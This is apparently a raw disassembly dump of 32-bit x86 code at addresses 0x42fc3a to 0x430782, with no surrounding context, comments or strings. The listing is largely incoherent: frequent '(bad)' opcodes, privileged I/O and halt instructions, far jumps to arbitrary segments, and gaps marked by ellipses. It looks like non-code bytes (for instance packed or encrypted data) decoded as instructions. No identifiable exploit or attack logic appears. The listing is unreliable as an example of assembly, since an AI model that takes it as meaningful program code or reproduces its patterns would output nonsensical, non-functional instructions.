  42fc3a:	xor    BYTE PTR [eax],dh
  42fc3c:	jmp    0x42fc6a
  42fc3e:	dec    ebp
  42fc3f:	retf   
  42fc40:	jp     0x42fc08
	...
  42fcb2:	add    BYTE PTR [eax],al
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0xf128e9b9
  42fcc3:	int3   
  42fcc4:	push   esi
  42fcc5:	stc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	test   BYTE PTR [eax],0x0
  42fccb:	add    BYTE PTR [ebx],cl
  42fccd:	data16 mov dl,0xc6
  42fcd0:	(bad)  
  42fcd1:	fld    QWORD PTR [eax]
  42fcd3:	mov    al,ds:0xa052a70a
  42fcd8:	pop    es
  42fcd9:	into   
  42fcda:	ficom  WORD PTR [esi]
  42fcdc:	adc    al,BYTE PTR [eax]
  42fcde:	dec    eax
  42fcdf:	sbb    bh,dl
  42fce1:	(bad)  
  42fce3:	(bad)  
  42fce5:	mov    esi,0x1342d1af
  42fcea:	add    ecx,DWORD PTR [ecx-0x10dbd51e]
  42fcf0:	jae    0x42fc8d
  42fcf2:	es dec ecx
  42fcf4:	xchg   edi,eax
  42fcf5:	inc    ecx
  42fcf6:	cmp    eax,0x2e38bc0c
  42fcfb:	lea    edi,[ecx+0x348a455b]
  42fd01:	dec    edx
  42fd02:	adc    BYTE PTR [ebp-0x6e0a6a30],0xdc
  42fd09:	dec    edi
  42fd0a:	mov    ?,WORD PTR [edi+0x3cb54e99]
  42fd10:	sahf   
  42fd11:	jno    0x42fd6f
  42fd13:	imul   ebx,DWORD PTR [ebx+eiz*2+0x3f],0xffffffb0
  42fd18:	bound  esi,QWORD PTR [ecx]
  42fd1a:	pop    es
  42fd1b:	mov    edi,0xa6ae81c6
  42fd20:	mov    ah,0x2e
  42fd22:	add    dh,BYTE PTR [esi-0x2e]
  42fd25:	inc    ebx
  42fd26:	cmp    esp,eax
  42fd28:	pop    eax
  42fd29:	scas   eax,DWORD PTR es:[edi]
  42fd2a:	xor    BYTE PTR [esi],al
  42fd2c:	jecxz  0x42fd79
  42fd2e:	ja     0x42fd4c
  42fd30:	lds    esi,FWORD PTR ss:[ebx]
  42fd33:	aam    0x82
  42fd35:	test   BYTE PTR [esp+edi*2],0x4e
  42fd39:	push   ebp
  42fd3a:	and    BYTE PTR [eax],bl
  42fd3c:	ret    0x5dc7
  42fd3f:	pop    ds
  42fd40:	adc    DWORD PTR [esi],esi
  42fd42:	stos   DWORD PTR es:[edi],eax
  42fd43:	int3   
  42fd44:	xor    BYTE PTR [edi],bl
  42fd46:	fs fs aas 
  42fd49:	sbb    eax,0xcb1a236f
  42fd4e:	push   esi
  42fd4f:	jae    0x42fda4
  42fd51:	xor    ah,BYTE PTR [eax+0x4a]
  42fd54:	ds dec ecx
  42fd56:	xchg   ebx,eax
  42fd57:	icebp  
  42fd58:	push   cs
  42fd59:	push   ss
  42fd5a:	mov    dh,0x41
  42fd5c:	jmp    0xaf91a90f
  42fd61:	or     ah,BYTE PTR [eax-0x6dcf8cfd]
  42fd67:	xchg   esp,eax
  42fd68:	shr    BYTE PTR [ecx-0x58f9c076],cl
  42fd6e:	enter  0x6f37,0x23
  42fd72:	sti    
  42fd73:	call   0x863d:0xe883b26
  42fd7a:	jns    0x42fd61
  42fd7c:	mov    eax,ds:0x29f09e67
  42fd81:	dec    eax
  42fd82:	icebp  
  42fd83:	mov    bh,0xcc
  42fd85:	xchg   BYTE PTR ds:0xc5629d2d,dl
  42fd8b:	xchg   esi,eax
  42fd8c:	jg     0x42fd53
  42fd8e:	dec    ecx
  42fd8f:	xor    al,0x9b
  42fd91:	pop    esi
  42fd92:	outs   dx,BYTE PTR ds:[esi]
  42fd93:	xor    ch,BYTE PTR [edx+ebx*1]
  42fd96:	cs or  eax,0xbb472d9a
  42fd9c:	ja     0x42fe11
  42fd9e:	push   ecx
  42fd9f:	add    eax,0x60ae5b4d
  42fda4:	fwait
  42fda5:	out    0xfa,eax
  42fda7:	test   al,0x84
  42fda9:	dec    edi
  42fdaa:	gs adc dl,0x70
  42fdae:	jmp    0x1581:0x61d1263d
  42fdb5:	vpmuludq ymm2,ymm4,YMMWORD PTR [ebx-0x696bea4d]
  42fdbe:	icebp  
  42fdbf:	pop    esp
  42fdc0:	add    ecx,ecx
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	not    DWORD PTR [ecx-0x5b313a8]
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	test   BYTE PTR [eax],0x0
  42fe4b:	add    al,dh
  42fe4d:	sub    al,0x28
  42fe4f:	jle    0x42feb0
  42fe51:	adc    BYTE PTR [eax+0x7e9902ae],dh
  42fe57:	js     0x42fe8f
  42fe59:	mov    esi,0x2397faa5
  42fe5e:	mul    DWORD PTR [edx+0x67]
  42fe61:	stos   BYTE PTR es:[edi],al
  42fe62:	ss lahf 
  42fe64:	enter  0x45d2,0x80
  42fe68:	mov    edx,0xe8c5bcf2
  42fe6d:	call   0x9180:0x576234c5
  42fe74:	aam    0x56
  42fe76:	test   DWORD PTR [edi],0x5c93166b
  42fe7c:	loopne 0x42fe90
  42fe7e:	ret    
  42fe7f:	sbb    eax,0xdc4d6bc6
  42fe84:	push   cs
  42fe85:	sahf   
  42fe86:	sti    
  42fe87:	mov    ecx,0x6770fd41
  42fe8c:	push   ebp
  42fe8d:	cli    
  42fe8e:	(bad)  
  42fe8f:	(bad)  
  42fe90:	jmp    0x1294a3fe
  42fe95:	sti    
  42fe96:	mov    ebx,0x982d286c
  42fe9b:	fwait
  42fe9c:	std    
  42fe9d:	leave  
  42fe9e:	inc    ebx
  42fe9f:	(bad)  
  42fea0:	fld    DWORD PTR [ebx+ebp*4-0x6cbef0b2]
  42fea7:	pop    esi
  42fea8:	sub    eax,0x35cd5f94
  42fead:	sbb    eax,0x924c0359
  42feb2:	push   edx
  42feb3:	cwde   
  42feb4:	mov    edi,0xfb160d18
  42feb9:	hlt    
  42feba:	xchg   BYTE PTR [ebx+edx*4],bl
  42febd:	push   ebx
  42febe:	call   0x872a:0x5bd29c3b
  42fec5:	hlt    
  42fec6:	jmp    DWORD PTR [esi]
  42fec8:	xor    BYTE PTR [esi+0x6a2b8781],cl
  42fece:	out    dx,eax
  42fecf:	cs sub al,0x1f
  42fed2:	dec    edx
  42fed3:	mov    esi,DWORD PTR [ecx+0x42]
  42fed6:	xchg   esi,eax
  42fed7:	out    0xf3,al
  42fed9:	inc    ebx
  42feda:	(bad)  
  42fedb:	mov    ebx,0xe05d313c
  42fee0:	xchg   edi,eax
  42fee1:	push   ss
  42fee2:	popa   
  42fee3:	pop    edi
  42fee4:	ja     0x42feab
  42fee6:	int    0xc3
  42fee8:	and    eax,0xc2635e4e
  42feed:	int3   
  42feee:	(bad)  
  42feef:	jg     0x42fef6
  42fef1:	xor    eax,0x1351520e
  42fef6:	aad    0xc2
  42fef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fef9:	or     al,0x8d
  42fefb:	aad    0xeb
  42fefd:	add    ebx,DWORD PTR [ecx+edx*8+0x34]
  42ff01:	mov    esi,0x244b336e
  42ff06:	(bad)  
  42ff08:	add    al,0x18
  42ff0a:	dec    BYTE PTR [ebp+ebx*1-0x37]
  42ff0e:	sbb    BYTE PTR [ebp-0x3c594c4e],0x65
  42ff15:	and    bl,BYTE PTR [ebx+0x49]
  42ff18:	or     esi,edi
  42ff1a:	inc    esp
  42ff1b:	xor    DWORD PTR [edx+0x72a73f18],esi
  42ff21:	adc    al,0x6c
  42ff23:	jmp    0x42ff5e
  42ff25:	iret   
  42ff26:	(bad)  
  42ff27:	call   FWORD PTR [eax+0x53]
  42ff2a:	mov    WORD PTR [ecx-0x551e1ee9],?
  42ff30:	jno    0x42fee8
  42ff32:	retf   0xbefd
  42ff35:	nop
  42ff36:	fdivr  DWORD PTR [eax+0x2dd84e5]
  42ff3c:	scas   eax,DWORD PTR es:[edi]
  42ff3d:	out    0xc0,eax
  42ff3f:	in     eax,dx
  42ff40:	jns    0x42ffaa
	...
  42ffb2:	add    BYTE PTR [eax],al
  42ffb4:	adc    bh,BYTE PTR [esi]
  42ffb6:	int    0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx+0x26897fea]
  42ffc1:	inc    ecx
  42ffc2:	fild   QWORD PTR [ebx]
  42ffc4:	inc    edx
  42ffc5:	sti    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	test   BYTE PTR [eax],0x0
  42ffcb:	add    BYTE PTR [ecx+0x7f],al
  42ffce:	ja     0x42ff83
  42ffd0:	dec    ecx
  42ffd1:	jge    0x42ffd3
  42ffd3:	loop   0x430021
  42ffd5:	push   edi
  42ffd6:	xchg   esp,eax
  42ffd7:	in     eax,0x44
  42ffd9:	in     eax,dx
  42ffda:	fisttp DWORD PTR ds:0x84749471
  42ffe0:	inc    ebx
  42ffe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffe2:	psrld  mm4,QWORD PTR [esi]
  42ffe5:	data16 (bad) [ebx]
  42ffe8:	arpl   si,di
  42ffea:	loop   0x42ffa3
  42ffec:	fnsave [ebp+0x4b9d65a8]
  42fff2:	jne    0x43001e
  42fff4:	sub    edx,DWORD PTR [esi+0x53]
  42fff7:	mov    dl,0x80
  42fff9:	dec    BYTE PTR [edx-0x4a269365]
  42ffff:	jo     0x430045
  430001:	pop    eax
  430002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430003:	cdq    
  430004:	cld    
  430005:	mov    ebp,0x1cbd277e
  43000a:	mov    ebx,0x449b1e08
  43000f:	sub    edi,DWORD PTR [edx]
  430011:	and    ch,BYTE PTR [edi-0xa]
  430014:	mov    esi,0xd17c5c1
  430019:	mov    ch,0xd0
  43001b:	cmp    dl,BYTE PTR [esp+eiz*8-0x5cfe754e]
  430022:	repz xchg esp,eax
  430024:	mov    edx,DWORD PTR [ebx-0x25]
  430027:	add    eax,0x7bce0318
  43002c:	adc    ah,dh
  43002e:	hlt    
  43002f:	out    0x3c,al
  430031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430032:	sbb    ah,bl
  430034:	out    0x75,al
  430036:	ret    
  430037:	std    
  430038:	(bad)  
  43003a:	push   0xcea5bcc
  43003f:	(bad)  
  430040:	xchg   edx,eax
  430041:	call   0xc92b1ad4
  430046:	loop   0x43008e
  430048:	jg     0x430026
  43004a:	(bad)  
  43004c:	add    DWORD PTR [edi],ecx
  43004e:	(bad)  [ecx-0x11]
  430051:	ds xor bh,al
  430054:	pmaxsw mm6,QWORD PTR [esi+eax*1+0x7006ca3f]
  43005c:	pop    ss
  43005d:	inc    esi
  43005e:	lds    edx,FWORD PTR [esi-0x3426eff0]
  430064:	push   0xe8db8b85
  430069:	jae    0x430091
  43006b:	mov    al,0x35
  43006d:	imul   esi,DWORD PTR [edx+0x49],0x5f
  430071:	sub    ch,ch
  430073:	out    dx,eax
  430074:	in     eax,dx
  430075:	(bad)  
  430077:	sbb    al,0x8c
  430079:	(bad)  [edx+ebx*1-0x20]
  43007d:	imul   ebp,DWORD PTR [ebx-0x6f],0x33
  430081:	jmp    0x324abd55
  430086:	sub    BYTE PTR [esi+0x22],dh
  430089:	jo     0x430080
  43008b:	cmc    
  43008c:	pop    edi
  43008d:	div    DWORD PTR [eax]
  43008f:	jmp    0xf28d:0x40eaed9a
  430096:	push   0xfffffff2
  430098:	push   es
  430099:	mov    dh,0xca
  43009b:	mov    esp,0x9ab03893
  4300a0:	in     eax,0xea
  4300a2:	icebp  
  4300a3:	jne    0x430062
  4300a5:	or     DWORD PTR [ebx],0xffffffb3
  4300a8:	fnstsw WORD PTR [ecx+0x6f99d965]
  4300ae:	call   0xcb4b:0xec44f4bb
  4300b5:	retf   0x6c55
  4300b8:	stos   BYTE PTR es:[edi],al
  4300b9:	repnz aam 0xe8
  4300bc:	push   ebp
  4300bd:	push   ds
  4300be:	push   edi
  4300bf:	das    
  4300c0:	or     eax,esp
	...
  430132:	add    BYTE PTR [eax],al
  430134:	pop    edx
  430135:	es jecxz 0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x6d7b:0x8e46a608
  430144:	cmp    ah,bh
  430146:	add    DWORD PTR [eax],eax
  430148:	test   BYTE PTR [eax],0x0
  43014b:	add    BYTE PTR [ebp-0x7ce94a4e],dl
  430151:	es dec edx
  430153:	cmp    BYTE PTR [edx],dh
  430155:	mov    bl,0x14
  430157:	repnz push 0xffffffea
  43015a:	jmp    0xbe7d:0xb7088d4d
  430161:	inc    esi
  430162:	out    dx,eax
  430163:	mov    bl,0x66
  430165:	daa    
  430166:	imul   edi,DWORD PTR [edi-0x36abe37b],0x64c2ba6b
  430170:	int    0x5c
  430172:	test   BYTE PTR [ebx-0x2d],al
  430175:	lock sbb DWORD PTR es:[esi+0x20],0xf43c3096
  43017e:	pop    ss
  43017f:	jnp    0x4301c5
  430181:	(bad)  [edi]
  430183:	jno    0x430122
  430185:	or     eax,0x7d06fc68
  43018a:	pusha  
  43018b:	aaa    
  43018c:	aam    0x14
  43018e:	add    eax,0xb7b5e20d
  430193:	in     al,0x99
  430195:	mov    DWORD PTR [edi+0x161bb43c],ecx
  43019b:	mov    ecx,0x11409a10
  4301a0:	aad    0xd8
  4301a2:	mov    esi,0x728f2fb8
  4301a7:	pop    esp
  4301a8:	mov    esi,0x5c3c07e8
  4301ad:	push   esp
  4301ae:	shr    ebx,cl
  4301b0:	imul   esi,DWORD PTR ds:0x9b3d8b5c,0x8a50bb55
  4301ba:	stos   DWORD PTR es:[edi],eax
  4301bb:	js     0x43013d
  4301bd:	and    al,0x1a
  4301bf:	mov    al,0xeb
  4301c1:	into   
  4301c2:	hlt    
  4301c3:	jp     0x430172
  4301c5:	hlt    
  4301c6:	aaa    
  4301c7:	out    0x9a,al
  4301c9:	jp     0x430150
  4301cb:	(bad)  
  4301cc:	dec    esp
  4301cd:	mov    esp,0x90427142
  4301d2:	daa    
  4301d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301d4:	shl    BYTE PTR [ebp-0x17f2899a],cl
  4301da:	or     BYTE PTR [ebx+0x42],0xc2
  4301de:	sahf   
  4301df:	sbb    dl,0x4b
  4301e2:	cwde   
  4301e3:	inc    edi
  4301e4:	push   ds
  4301e5:	xlat   BYTE PTR ds:[ebx]
  4301e6:	dec    ebx
  4301e7:	rol    BYTE PTR [edx],1
  4301e9:	push   eax
  4301ea:	sbb    BYTE PTR [ebx-0x2d46626],0x4c
  4301f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4301f2:	mov    cl,0x8a
  4301f4:	cmp    eax,esp
  4301f6:	mov    ah,0xb5
  4301f8:	and    BYTE PTR [eax+esi*1+0x3aedced8],dl
  4301ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430200:	ja     0x4301f2
  430202:	fs push edi
  430204:	or     esi,DWORD PTR [edi]
  430206:	xchg   ebx,eax
  430207:	xor    al,0x77
  430209:	add    ecx,DWORD PTR [ecx-0x59]
  43020c:	fcomp  DWORD PTR [eax]
  43020e:	(bad)  
  43020f:	(bad)  
  430212:	push   ebp
  430213:	fwait
  430214:	sbb    eax,0x92eba675
  430219:	dec    ebp
  43021a:	fstp   st(4)
  43021c:	in     al,0x83
  43021e:	jbe    0x43020d
  430220:	lds    ebp,FWORD PTR [edi+0x38ee6c71]
  430226:	fld    DWORD PTR [esi]
  430228:	jge    0x430202
  43022a:	add    BYTE PTR [edx-0x5edbda81],bl
  430230:	cmp    dh,ah
  430232:	pushf  
  430233:	(bad)  
  430234:	push   0x7563ca4a
  430239:	rol    BYTE PTR [esi],cl
  43023b:	imul   ebp,DWORD PTR es:[ebp-0x7b],0x559993
	...
  4302b3:	add    BYTE PTR [ebp-0x5075f7e6],bh
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	adc    DWORD PTR [ebx-0x2d1d344],ecx
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	test   BYTE PTR [eax],0x0
  4302cb:	add    BYTE PTR [edi],bh
  4302cd:	and    ah,BYTE PTR [edi+eax*2-0x62aa16c1]
  4302d4:	mov    esi,0x4969fb8e
  4302d9:	push   es
  4302da:	shr    DWORD PTR [edx+0xe],cl
  4302dd:	outs   dx,DWORD PTR ds:[esi]
  4302de:	xor    al,0xbc
  4302e0:	jmp    0x9e6a:0x4b2812ac
  4302e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4302e8:	xor    al,0xa8
  4302ea:	cmp    ch,BYTE PTR [edi+ebp*1]
  4302ed:	loop   0x4302d6
  4302ef:	rcr    BYTE PTR [ebp+edx*4-0x55da9f0f],cl
  4302f6:	push   0x9202ee10
  4302fb:	jp     0x4302b8
  4302fd:	mov    esi,0x931331bc
  430302:	adc    eax,0x63016201
  430307:	rcr    DWORD PTR [ebp+edi*1-0x7a],0x94
  43030c:	and    BYTE PTR [ecx],0x9e
  43030f:	xor    cl,bh
  430311:	arpl   WORD PTR ds:[eax],dx
  430314:	pop    edx
  430315:	mov    ebx,DWORD PTR [eax+0x567fec06]
  43031b:	add    dl,dl
  43031d:	stos   BYTE PTR es:[edi],al
  43031e:	and    BYTE PTR [eax-0x1d824f1f],dl
  430324:	popa   
  430325:	sbb    ecx,DWORD PTR [edx+0x58]
  430328:	mov    al,ds:0x562931fd
  43032d:	outs   dx,DWORD PTR ds:[esi]
  43032e:	push   ecx
  43032f:	aad    0x95
  430331:	inc    ecx
  430332:	push   ds
  430333:	cdq    
  430334:	in     al,dx
  430335:	and    eax,DWORD PTR [ecx]
  430337:	scas   al,BYTE PTR es:[edi]
  430338:	dec    eax
  430339:	jno    0x430363
  43033b:	inc    edx
  43033c:	adc    eax,0x98da691e
  430341:	(bad)  
  430342:	pop    es
  430343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430344:	cmp    al,0x6a
  430346:	dec    ebp
  430347:	cmp    al,0xa2
  430349:	(bad)  
  43034a:	(bad)  
  43034b:	mov    ebp,0x6640b493
  430350:	rol    BYTE PTR [esi],cl
  430352:	inc    edx
  430353:	jae    0x430341
  430355:	(bad)
  430358:	(bad)  
  430359:	xchg   edi,eax
  43035a:	in     eax,0x4e
  43035c:	andps  xmm6,xmm0
  43035f:	lea    ecx,[ebx]
  430361:	add    al,0x27
  430363:	nop
  430364:	adc    esi,ebx
  430366:	nop
  430367:	cmp    al,0x26
  430369:	or     eax,0x31b7dbbe
  43036e:	xchg   ebp,eax
  43036f:	faddp  st(2),st
  430371:	dec    edi
  430372:	idiv   DWORD PTR [edx+0x18]
  430375:	leave  
  430376:	mov    dh,0x50
  430378:	sub    al,0xe5
  43037a:	push   0x61adb997
  43037f:	leave  
  430380:	fstp   DWORD PTR [ebx]
  430382:	ins    BYTE PTR es:[edi],dx
  430383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430384:	jge    0x4303a4
  430386:	inc    ebp
  430387:	jmp    0x8e91:0x406f94c6
  43038e:	xlat   BYTE PTR ds:[ebx]
  43038f:	push   eax
  430390:	inc    eax
  430391:	pop    ebp
  430393:	push   ecx
  430394:	jns    0x4303be
  430396:	rol    BYTE PTR [edi+eax*8+0x7f],0xa0
  43039b:	mov    dl,cl
  43039d:	stos   DWORD PTR es:[edi],eax
  43039e:	ja     0x430370
  4303a0:	add    eax,0x34431e85
  4303a5:	in     al,dx
  4303a6:	fnstcw WORD PTR [edi-0x45cad754]
  4303ac:	add    eax,ebx
  4303ae:	pop    edx
  4303af:	and    al,BYTE PTR [edi+0x66c160a4]
  4303b5:	cmp    al,0x4f
  4303b7:	hlt    
  4303b8:	adc    al,0x2e
  4303ba:	outs   dx,DWORD PTR ds:[esi]
  4303bb:	popa   
  4303bc:	and    esp,DWORD PTR [eax-0x59463c32]
	...
  430432:	add    BYTE PTR [eax],al
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfe24:0x92cc981c
  430446:	add    DWORD PTR [eax],eax
  430448:	test   BYTE PTR [eax],0x0
  43044b:	add    BYTE PTR [ecx],dh
  43044d:	pusha  
  43044e:	test   al,0xf
  430450:	test   edi,ebx
  430452:	(bad)  
  430453:	and    DWORD PTR [ebx-0x6a],edx
  430456:	jbe    0x43049f
  430458:	mov    ebx,0x56491b9
  43045d:	iret   
  43045e:	xor    BYTE PTR [edi],cl
  430460:	inc    eax
  430461:	fwait
  430462:	repz and edi,DWORD PTR [ecx*4+0x6b25ce32]
  43046a:	ror    DWORD PTR [edx+0x33009948],0x55
  430471:	dec    edx
  430472:	retf   
  430473:	cmp    DWORD PTR [ebp+0x125c76be],eax
  430479:	arpl   WORD PTR [edx],bx
  43047b:	xor    dl,BYTE PTR [ebx]
  43047d:	stos   BYTE PTR es:[edi],al
  43047e:	push   ss
  43047f:	add    dh,ah
  430481:	push   ecx
  430482:	mov    dl,0x80
  430484:	sub    DWORD PTR [esi+0xb4330f4],esp
  43048a:	gs sti 
  43048c:	or     BYTE PTR [ecx+0x64],0xa
  430490:	xchg   BYTE PTR [eax+0x36351177],bl
  430496:	xchg   esp,eax
  430497:	xchg   esp,eax
  430498:	pop    ebx
  430499:	lahf   
  43049a:	lods   al,BYTE PTR ds:[esi]
  43049b:	xchg   esi,eax
  43049c:	xchg   esp,eax
  43049d:	push   edi
  43049e:	dec    ebp
  43049f:	retf   0x668b
  4304a2:	cmc    
  4304a3:	in     eax,dx
  4304a4:	fimul  DWORD PTR [esp+ebp*4-0x5a]
  4304a8:	mov    eax,0x9fcf0788
  4304ad:	jmp    0xd7bf:0xfaf352e3
  4304b4:	xchg   esp,eax
  4304b5:	adc    al,0x38
  4304b7:	pop    ebp
  4304b8:	repz test eax,0xc2fbe037
  4304be:	sub    eax,0xd2d8f29a
  4304c3:	in     eax,dx
  4304c4:	out    dx,al
  4304c5:	mov    dh,BYTE PTR [ecx+0x4ebb6af5]
  4304cb:	mov    ebx,0x929a4b61
  4304d0:	js     0x4304c4
  4304d2:	jns    0x43047d
  4304d4:	popf   
  4304d5:	jmp    0xee2a7ee9
  4304da:	cmp    cl,al
  4304dc:	bound  esp,QWORD PTR [ecx]
  4304de:	mov    BYTE PTR [esi-0x1ae643a6],cl
  4304e4:	mov    eax,ds:0xa9450841
  4304e9:	inc    esi
  4304ea:	mov    ?,esp
  4304ec:	cmp    ebx,DWORD PTR [eax+0x44]
  4304ef:	xchg   esp,eax
  4304f0:	mov    esp,0xb442abc1
  4304f5:	mov    ah,BYTE PTR [esi+0x55]
  4304f8:	data16 in al,dx
  4304fa:	lahf   
  4304fb:	iret   
  4304fc:	loope  0x43053a
  4304fe:	lahf   
  4304ff:	ds or  al,0x73
  430502:	stos   DWORD PTR es:[edi],eax
  430503:	cld    
  430504:	pusha  
  430505:	push   0xc1261eb9
  43050a:	inc    ecx
  43050b:	rcl    edx,0x2d
  43050e:	(bad)  
  43050f:	xor    eax,0x16248034
  430514:	and    dl,BYTE PTR [ebx]
  430516:	jbe    0x4304a1
  430518:	or     ebp,DWORD PTR [ebp+0x12]
  43051b:	mov    bh,0x8d
  43051d:	in     al,dx
  43051e:	pop    edi
  43051f:	sti    
  430520:	fs dec eax
  430522:	mov    cl,0x2
  430524:	aad    0x5d
  430526:	inc    ebx
  430527:	retf   
  430528:	pop    esi
  430529:	and    bh,BYTE PTR [edx]
  43052b:	inc    esi
  43052c:	retf   0x35e5
  43052f:	les    ecx,FWORD PTR fs:[eax-0x226ec9e4]
  430536:	adc    DWORD PTR [edi+0x4a2f8e0e],esp
  43053c:	call   0x20:0x69b2aade
	...
  4305b3:	add    BYTE PTR [esi],bh
  4305b5:	push   esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi+0x68]
  4305c1:	scas   al,BYTE PTR es:[edi]
  4305c2:	rcr    BYTE PTR [ebx],1
  4305c4:	sbb    bh,bh
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	test   BYTE PTR [eax],0x0
  4305cb:	add    BYTE PTR [ecx-0x11],dl
  4305ce:	ret    0x72c0
  4305d1:	push   edx
  4305d2:	mov    esp,0x4e09528b
  4305d7:	mov    eax,0x56f43171
  4305dc:	jns    0x430578
  4305de:	dec    ebp
  4305df:	push   es
  4305e0:	aas    
  4305e1:	or     cl,dh
  4305e3:	mov    ebp,0x7575a349
  4305e8:	adc    al,0xd6
  4305ea:	xlat   BYTE PTR ds:[ebx]
  4305eb:	sbb    al,0x7e
  4305ed:	and    ebx,DWORD PTR [esi+0x4a601c87]
  4305f3:	mov    bh,0x87
  4305f5:	sbb    cl,0x82
  4305f8:	outs   dx,BYTE PTR ds:[esi]
  4305f9:	adc    edx,DWORD PTR [ecx+edx*8+0x1148e9fa]
  430600:	cwde   
  430601:	hlt    
  430602:	lidtd  [edx]
  430605:	mov    eax,0xb279237b
  43060a:	aaa    
  43060b:	push   ebp
  43060c:	lods   al,BYTE PTR ds:[esi]
  43060d:	outs   dx,BYTE PTR ds:[esi]
  43060e:	fs in  al,0xf3
  430611:	ja     0x43059b
  430613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430614:	inc    edi
  430615:	xchg   esp,eax
  430616:	lahf   
  430617:	mov    ecx,0xdc42d724
  43061c:	jnp    0x430692
  43061e:	push   0xfffffff6
  430620:	fstp   DWORD PTR ds:0x678a751e
  430626:	xor    DWORD PTR [ecx],ecx
  430628:	and    eax,0xe914b0d6
  43062d:	or     BYTE PTR [ebp+0x69],0xcb
  430631:	mov    al,ds:0xceb325ed
  430636:	and    BYTE PTR [edi],dh
  430638:	jb     0x4305df
  43063a:	dec    esp
  43063b:	mov    dl,0xca
  43063d:	pop    esi
  43063e:	jo     0x430688
  430640:	jo     0x4306be
  430642:	sbb    DWORD PTR [edx-0x28a7dc6d],ebx
  430648:	pop    esi
  430649:	iret   
  43064a:	push   ss
  43064b:	out    dx,al
  43064c:	mov    cl,0xa1
  43064e:	xchg   ecx,eax
  43064f:	jne    0x430696
  430651:	mov    dx,0x6263
  430655:	or     eax,0x972abde5
  43065a:	outs   dx,BYTE PTR ds:[esi]
  43065b:	test   eax,edi
  43065d:	leave  
  43065e:	faddp  st(3),st
  430660:	aam    0xba
  430662:	inc    edx
  430663:	cmp    BYTE PTR ds:0xb4d2805e,bh
  430669:	retf   0xb1ca
  43066c:	mov    ebx,0x393d296d
  430671:	(bad)  
  430672:	ror    BYTE PTR [ebp-0x2d699327],cl
  430678:	xchg   esp,eax
  430679:	stos   DWORD PTR es:[edi],eax
  43067a:	inc    edx
  43067b:	xchg   al,bh
  43067d:	add    al,0x5b
  43067f:	inc    ebx
  430680:	add    eax,0x985450c7
  430685:	mov    al,ds:0x7f3db761
  43068a:	sub    BYTE PTR [esi],bh
  43068c:	or     DWORD PTR [esi],eax
  43068e:	push   edi
  43068f:	pusha  
  430690:	adc    DWORD PTR [ecx+ebx*4-0x25920a08],eax
  430697:	fstp   st(7)
  430699:	mul    DWORD PTR [eax+0x67]
  43069c:	(bad)  
  43069d:	rcl    BYTE PTR [edi+esi*1],cl
  4306a0:	mov    DWORD PTR [edi],edi
  4306a2:	stos   DWORD PTR es:[edi],eax
  4306a3:	int3   
  4306a4:	xchg   ch,cl
  4306a6:	jg     0x4306f7
  4306a8:	out    0x28,eax
  4306aa:	jmp    0x43068e
  4306ac:	arpl   WORD PTR [ecx],bp
  4306ae:	xor    BYTE PTR [esi+0x16],ah
  4306b1:	lock imul edi,ebp,0x6c
  4306b5:	jae    0x430712
  4306b7:	jmp    0x6ddbe608
  4306bc:	lahf   
  4306bd:	test   DWORD PTR [edi+0x704821],0x0
	...
  430733:	add    BYTE PTR [ecx-0x5f],dh
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0xfe
  430741:	jl     0x4306e7
  430743:	mov    cl,0x10
  430745:	add    BYTE PTR [edx],al
  430747:	add    dh,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [ebp+0x2c],dh
  43074e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43074f:	pusha  
  430750:	pop    ss
  430751:	sub    BYTE PTR [eax-0x51],dh
  430754:	add    esi,eax
  430756:	jp     0x4306df
  430758:	aas    
  430759:	sub    DWORD PTR [eax+ecx*2],edx
  43075c:	push   cs
  43075d:	xor    ecx,ecx
  43075f:	xchg   DWORD PTR [ebx+0x5e52825b],esi
  430765:	iret   
  430766:	cli    
  430767:	ror    dh,cl
  430769:	sbb    edi,esi
  43076b:	fsubr  DWORD PTR [eax]
  43076d:	call   0x9a34d5da
  430772:	test   al,0x3d
  430774:	call   0x351b:0xd871d122
  43077b:	fcmovb st,st(0)
  43077d:	push   es
  43077e:	push   ebx
  43077f:	jae    0x4307c9
  430781:	pusha  
  430782:	neg    BYTE PTR [edi+0x68e66e2c]
